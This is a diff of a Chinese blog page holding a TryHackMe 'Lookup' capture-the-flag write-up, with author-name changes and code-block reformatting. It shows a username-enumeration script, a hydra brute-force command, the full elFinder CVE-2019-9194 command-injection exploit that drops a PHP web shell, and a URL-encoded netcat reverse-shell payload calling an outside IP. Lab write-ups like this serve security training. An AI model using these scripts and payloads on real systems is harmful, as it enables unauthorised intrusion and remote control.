@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="lookup">
 <meta property="og:url" content="http://example.com/2025/04/02/lookup/index.html">
-<meta property="og:site_name" content="jujub3">
+<meta property="og:site_name" content="juju">
 <meta property="og:description" content="首先需要改在hosts里面加一个：10.10.46.174   lookup.thm   以防止重定向。 仔细观察两个抓包页面：">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/lookup/1.png">
@@ -28,7 +28,7 @@
 <meta property="og:image" content="http://example.com/lookup/15.png">
 <meta property="article:published_time" content="2025-04-02T15:02:24.000Z">
 <meta property="article:modified_time" content="2025-04-02T15:18:18.767Z">
-<meta property="article:author" content="jujub3">
+<meta property="article:author" content="juju">
 <meta property="article:tag" content="THM">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/lookup/1.png">
@@ -146,7 +146,7 @@
 
     <div class="meta">
       <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">jujub3</span>
+        <span class="p-name" itemprop="name">juju</span>
       </span>
       
     <div class="postdate">
@@ -178,132 +178,33 @@
 <p><img src="/../lookup/1.png" alt="1"></p>
 <p><img src="/../lookup/2.png" alt="2"></p>
 <p>一个返回Wrong username or password一个返回 Wrong password，所以断定存在一个admin账户。</p>
-<pre><code class="language-python">import requests
-wordlist = &quot;/usr/share/seclists/Usernames/Names/names.txt&quot;
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">wordlist = <span class="string">&quot;/usr/share/seclists/Usernames/Names/names.txt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(wordlist, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        username = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;testpassword&quot;</span>&#125;</span><br><span class="line">        response = requests.post(url=<span class="string">&quot;http://lookup.thm/login.php&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong password&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] Found a username! \&quot;<span class="subst">&#123;username&#125;</span>\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
 
 
-with open(wordlist, &#39;r&#39;) as f:
-    for line in f:
-        username = line.strip()
-        if not username:
-            continue
 
-        data = &#123;&quot;username&quot;: username,
-                &quot;password&quot;: &quot;testpassword&quot;&#125;
-        response = requests.post(url=&quot;http://lookup.thm/login.php&quot;, data=data)
-
-        if &quot;Wrong password&quot; in response.text:
-            print(f&quot;\r[*] Found a username! \&quot;&#123;username&#125;\&quot;&quot;)
-
-
-print()
-</code></pre>
 <p><img src="/../lookup/3.png" alt="3"></p>
 <p>发现存在一个jose</p>
-<pre><code class="language-cmd">hydra -l jose -P 10-million-password.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V
-</code></pre>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jose -P <span class="number">10</span>-million-password.txt lookup.thm http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong&quot; -V</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>这个爆破有点慢，可以直接用yakit来进行爆破，最后得到账号密码：最后成功进入后台</p>
-<pre><code>jose
-password123
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jose</span><br><span class="line">password123</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../lookup/4.png" alt="4"></p>
 <p>然后根据<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46481">https://www.exploit-db.com/exploits/46481</a></p>
-<pre><code class="language-python">#!/usr/bin/python
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.</span></span><br><span class="line"><span class="string"># Date: 26/02/2019</span></span><br><span class="line"><span class="string"># Exploit Author: @q3rv0</span></span><br><span class="line"><span class="string"># Vulnerability reported by: Thomas Chauchefoin</span></span><br><span class="line"><span class="string"># Google Dork: intitle:&quot;elFinder 2.1.x&quot;</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://studio-42.github.io/elFinder/</span></span><br><span class="line"><span class="string"># Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz</span></span><br><span class="line"><span class="string"># Version: &lt;= 2.1.47</span></span><br><span class="line"><span class="string"># Tested on: Linux 64bit + Python2.7</span></span><br><span class="line"><span class="string"># PoC: https://www.portal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/</span></span><br><span class="line"><span class="string"># CVE: CVE-2019-9194</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Usage: python exploit.py [URL]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保同级目录下存在一个jpg文件</span></span><br><span class="line">payload = <span class="string">&quot;test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; hack.php;echo test.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exploit.py [URL]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url, payload</span>):</span><br><span class="line">    files = &#123;<span class="string">&quot;upload[]&quot;</span>: (payload, <span class="built_in">open</span>(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;reqid&quot;</span>: <span class="string">&quot;1693222c439f4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;target&quot;</span>: <span class="string">&quot;l1_Lw&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mtime[]&quot;</span>: <span class="string">&quot;1497726174&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">&quot;%s/php/connector.minimal.php&quot;</span> % url, files=files, data=data)</span><br><span class="line">    j = json.loads(r.text)</span><br><span class="line">    <span class="keyword">return</span> j[<span class="string">&quot;added&quot;</span>][<span class="number">0</span>][<span class="string">&quot;hash&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgRotate</span>(<span class="params">url, <span class="built_in">hash</span></span>):</span><br><span class="line">    r = requests.get(</span><br><span class="line">        <span class="string">&quot;%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c&quot;</span></span><br><span class="line">        % (url, <span class="built_in">hash</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>(<span class="params">url</span>):</span><br><span class="line">    r = requests.get(<span class="string">&quot;%s/php/hack.php&quot;</span> % url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Pwned! :)&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Getting the shell...&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                inputs = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">                r = requests.get(<span class="string">&quot;%s/php/hack.php?c=%s&quot;</span> % (url, inputs))</span><br><span class="line">                <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                sys.exit(<span class="string">&quot;\nBye kaker!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] The site seems not to be vulnerable :(&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    usage()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Uploading the malicious image...&quot;</span>)</span><br><span class="line">    <span class="built_in">hash</span> = upload(url, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Running the payload...&quot;</span>)</span><br><span class="line">    imgRotate(url, <span class="built_in">hash</span>)</span><br><span class="line">    shell(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-&quot;&quot;&quot;
-# Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.
-# Date: 26/02/2019
-# Exploit Author: @q3rv0
-# Vulnerability reported by: Thomas Chauchefoin
-# Google Dork: intitle:&quot;elFinder 2.1.x&quot;
-# Vendor Homepage: https://studio-42.github.io/elFinder/
-# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
-# Version: &lt;= 2.1.47
-# Tested on: Linux 64bit + Python2.7
-# PoC: https://www.portal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
-# CVE: CVE-2019-9194
-
-# Usage: python exploit.py [URL]
-&quot;&quot;&quot;
-
-import requests
-import json
-import sys
-
-# 确保同级目录下存在一个jpg文件
-payload = &quot;test.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; hack.php;echo test.jpg&quot;
-
-
-def usage():
-    if len(sys.argv) != 2:
-        print(&quot;Usage: python exploit.py [URL]&quot;)
-        sys.exit(0)
-
-
-def upload(url, payload):
-    files = &#123;&quot;upload[]&quot;: (payload, open(&quot;test.jpg&quot;, &quot;rb&quot;))&#125;
-    data = &#123;
-        &quot;reqid&quot;: &quot;1693222c439f4&quot;,
-        &quot;cmd&quot;: &quot;upload&quot;,
-        &quot;target&quot;: &quot;l1_Lw&quot;,
-        &quot;mtime[]&quot;: &quot;1497726174&quot;,
-    &#125;
-
-    r = requests.post(&quot;%s/php/connector.minimal.php&quot; % url, files=files, data=data)
-    j = json.loads(r.text)
-    return j[&quot;added&quot;][0][&quot;hash&quot;]
-
-
-def imgRotate(url, hash):
-    r = requests.get(
-        &quot;%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c&quot;
-        % (url, hash)
-    )
-    return r.text
-
-
-def shell(url):
-    r = requests.get(&quot;%s/php/hack.php&quot; % url)
-    if r.status_code == 200:
-        print(&quot;[+] Pwned! :)&quot;)
-        print(&quot;[+] Getting the shell...&quot;)
-        while 1:
-            try:
-                inputs = input(&quot;$ &quot;)
-                r = requests.get(&quot;%s/php/hack.php?c=%s&quot; % (url, inputs))
-                print(r.text)
-            except KeyboardInterrupt:
-                sys.exit(&quot;\nBye kaker!&quot;)
-    else:
-        print(&quot;[*] The site seems not to be vulnerable :(&quot;)
-
-
-def main():
-    usage()
-    url = sys.argv[1]
-    print(&quot;[*] Uploading the malicious image...&quot;)
-    hash = upload(url, payload)
-    print(&quot;[*] Running the payload...&quot;)
-    imgRotate(url, hash)
-    shell(url)
-
-
-if __name__ == &quot;__main__&quot;:
-    main()
-</code></pre>
 <p>成功拿到shell：</p>
 <p><img src="/../lookup/5.png" alt="5"></p>
 <p>现在我们创建一个有效载荷来建立一个交互式 shell。为此，我们使用 revshell.com。我们选择<code>nc mkfifo</code>一个并对有效载荷进行 URL 编码，因为我们有一个 web shell</p>
 <p><img src="/../lookup/6.png" alt="6"></p>
-<pre><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.33.100%208888%20%3E%2Ftmp%2Ff
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.17.33.100%208888%20%3E%2Ftmp%2Ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p><img src="/../lookup/9.png" alt="9"></p>
 <p>查找具有suid权限的二进制文：find &#x2F; -perm &#x2F;4000 2&gt;&#x2F;dev&#x2F;null | xargs ls -l</p>
 <p>发现了一个可疑的文件：-rwsr-sr-x 1 root   root             17176 Jan 11  2024 &#x2F;usr&#x2F;sbin&#x2F;pwm</p>
 <p>ssh进行远程连接，拿到第一个flag，然后sudo -l  查看当前用户在系统上可以使用sudo执行的命令。</p>
-<pre><code>think
-josemario.AKA(think)
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">think</span><br><span class="line">josemario.AKA(think)</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../lookup/10.png" alt="10"></p>
 <p><img src="/../lookup/11.png" alt="11"></p>
 <p>发现有个look直接去：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   搜索，它有个读文件的用法：</p>
@@ -391,7 +292,7 @@ josemario.AKA(think)
     
     
     2025
-    jujub3
+    juju
   </div>
   <div class="footer-right">
     <nav>
